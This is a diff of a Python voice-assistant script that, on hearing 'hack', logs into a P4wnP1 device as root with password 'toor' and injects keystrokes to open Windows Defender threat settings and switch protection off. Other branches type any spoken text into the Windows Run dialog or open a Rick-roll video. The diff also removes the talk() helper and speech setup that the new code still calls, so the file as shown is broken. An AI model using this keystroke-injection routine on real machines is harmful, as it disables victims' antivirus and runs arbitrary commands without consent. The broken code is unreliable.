@@ -1,18 +1,78 @@
-from pyttsx3 import Engine
-import speech_recognition as sr
-import pyttsx3
-from time import sleep
-import datetime
+def take_command():
+    r = sr.Recognizer()
 
-listener = sr.Recognizer()
-engine: Engine = pyttsx3.init('sapi5')
-voices = engine.getProperty('voices')
-engine.setProperty('voice', voices[0].id)
-engine.setProperty('rate', 171)
-engine.setProperty('volume', 150)
-engine.runAndWait()
+    with sr.Microphone() as source:
+        print("Listening...")
+        r.pause_threshold = 1
+        audio = r.listen(source, 0, 4)
 
-def talk(text):
-    engine.say(text)
-    print(text)
-    engine.runAndWait()
+    try:
+        print("Recognizing..")
+        query = r.recognize_google(audio, language="en-in")
+        print(f"You Said : {query}")
+        return query
+
+    except:
+        return ""
+
+    query = str(query)
+    return query.lower()
+
+def main():
+    while True:
+        command = take_command()
+        if "hack" in command:
+            talk("Sure sir, Hacking into the system")
+            hostname = "192.168.245.205"
+            username = "root"
+            password = "toor"
+            talk("Sending Keystrokes to Deactivate the Security Systems")
+            command_to_execute = """P4wnP1_cli hid run -c 'layout("us");
+            press("GUI r");
+            delay(500);
+            type("windowsdefender://ThreatSettings")
+            delay(200);
+            press("ENTER");
+            delay(1000);
+            press("SPACE");
+            delay(1000);
+            press("SHIFT TAB");
+            delay(200);
+            press("ENTER");
+            delay(500);
+            press("ALT F4");' """
+
+            # Call the function with your parameters
+            ssh_execute_command(hostname, username, password, command_to_execute)
+            talk("Security System Deactivated")
+            break
+        elif "Rick roll" in command:
+            hostname = "192.168.245.205"
+            username = "root"
+            password = "toor"
+            command_to_execute = """P4wnP1_cli hid run -c 'layout("us");
+            press("GUI r");
+            delay(2000);
+            type("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+            press("ENTER");
+            delay(1000);
+            press("SPACE");' """
+        elif "type" in command:
+            talk("what you want to type?")
+            cmd=take_command()
+            hostname = "192.168.245.205"
+            username = "root"
+            password = "toor"
+            command_to_execute = f"""P4wnP1_cli hid run -c 'layout("us");
+            press("GUI r");
+            delay(500);
+            type("{cmd}")' """
+
+            # Call the function with your parameters
+            ssh_execute_command(hostname, username, password, command_to_execute)
+            break
+            print("virus")
+            
+        elif "sleep" in command:
+            break
+     
